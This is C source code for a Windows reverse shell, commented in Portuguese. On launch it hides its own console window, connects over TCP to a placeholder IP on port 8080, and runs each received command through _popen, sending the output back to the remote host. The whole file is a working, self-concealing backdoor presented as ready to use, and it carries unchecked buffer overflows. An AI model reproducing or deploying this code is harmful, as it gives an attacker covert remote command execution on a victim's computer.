#include <winsock2.h>  // Biblioteca para comunicação em rede
#include <windows.h>   // Funcionalidades do sistema Windows
#include <ws2tcpip.h>  // Definições para sockets TCP/IP
#include <string.h>    // Manipulação de strings
#include <stdio.h>     // Funções de entrada/saída padrão

#pragma comment(lib, "Ws2_32.lib") // Link da biblioteca Ws2_32.lib
#define DEFAULT_BUFLEN 1024 // Tamanho do buffer padrão

// Declarações de funções
void execute_command(char* output_buffer, int buffer_size, const char *command);
void start_reverse_shell();

// Função principal
int main() {
    HWND console_window; // Variável para a janela do console
    AllocConsole(); // Aloca um novo console
    console_window = FindWindowA("ConsoleWindowClass", NULL); // Encontra a janela do console
    ShowWindow(console_window, SW_HIDE); // Oculta a janela do console
    start_reverse_shell(); // Inicia a shell reversa
    return 0; // Finaliza a função main
}

// Função que executa um comando e retorna a saída
void execute_command(char* output_buffer, int buffer_size, const char *command) {
    FILE* process; // Ponteiro para o processo
    char buffer[DEFAULT_BUFLEN]; // Buffer para a saída do comando

    // Tenta abrir um processo para executar o comando
    process = _popen(command, "r");
    if (process == NULL) {
        snprintf(output_buffer, buffer_size, "[x] ERRO ao executar o comando...\n"); // Retorna erro em caso de falha
        return;
    }

    // Lê a saída do comando
    while (fgets(buffer, sizeof(buffer), process) != NULL) {
        strcat(output_buffer, buffer); // Adiciona a saída ao buffer de saída
    }

    _pclose(process); // Fecha o processo
}

// Função para criar uma shell reversa
void start_reverse_shell() {
    WSADATA wsa_data; // Estrutura para informações do Winsock

    WSAStartup(MAKEWORD(2, 2), &wsa_data); // Inicializa o Winsock

    SOCKET tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Cria um socket TCP

    sockaddr_in server_address; // Estrutura para armazenar informações do servidor
    server_address.sin_family = AF_INET; // Define a família de endereços como IPv4
    server_address.sin_addr.s_addr = inet_addr("192.168.0.X"); // Endereço IP do servidor
    server_address.sin_port = htons(8080); // Porta do servidor

    // Tenta conectar ao servidor
    if (connect(tcp_socket, (SOCKADDR*)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
        closesocket(tcp_socket); // Fecha o socket em caso de erro
        WSACleanup(); // Limpa o Winsock
        exit(0); // Sai do programa
    } 

    char command_buffer[DEFAULT_BUFLEN] = ""; // Buffer para comandos recebidos
    while (true) {
        // Recebe o comando do servidor
        int result = recv(tcp_socket, command_buffer, DEFAULT_BUFLEN, 0);
        if (result == SOCKET_ERROR || result == 0) { // Verifica se houve erro ou conexão fechada
            break; // Sai do loop
        }
        command_buffer[result] = '\0'; // Adiciona terminador nulo

        char output_buffer[DEFAULT_BUFLEN] = ""; // Buffer para a saída do comando
        execute_command(output_buffer, sizeof(output_buffer), command_buffer); // Executa o comando

        // Envia a saída de volta ao servidor
        send(tcp_socket, output_buffer, strlen(output_buffer), 0); 
        memset(command_buffer, 0, sizeof(command_buffer)); // Limpa o buffer de comando
    }

    closesocket(tcp_socket); // Fecha o socket
    WSACleanup(); // Limpa o Winsock
    exit(0); // Sai do programa
}
